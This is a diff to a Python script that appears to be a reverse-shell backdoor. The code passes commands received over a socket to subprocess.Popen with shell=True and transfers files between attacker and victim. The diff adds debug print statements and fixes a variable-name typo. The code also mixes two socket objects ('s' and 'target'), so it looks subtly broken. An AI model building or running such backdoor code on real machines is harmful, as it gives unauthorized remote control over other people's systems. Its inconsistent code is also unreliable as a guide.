@@ -14,10 +14,15 @@ def reliable_recv():
             continue
 
 def download_file(file):
+    print("Downloading file %s" % file)
+    print("Starting file download from remote host")
     with open(file, "wb") as f:
+        print("set the timeout to 1")
         s.settimeout(1)
+        print("Trying to recv 1024 bytes")
         chunk = target.recv(1024)
         while chunk:
+            print("entered while loop")
             f.write(chunk)
             try:
                 chunk = s.recv(1024)
@@ -45,7 +50,7 @@ def shell():
             upload_file(command[9:])
 
         elif command[:6] == "upload":
-            download_file(comamnd[7:])
+            download_file(command[7:])
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
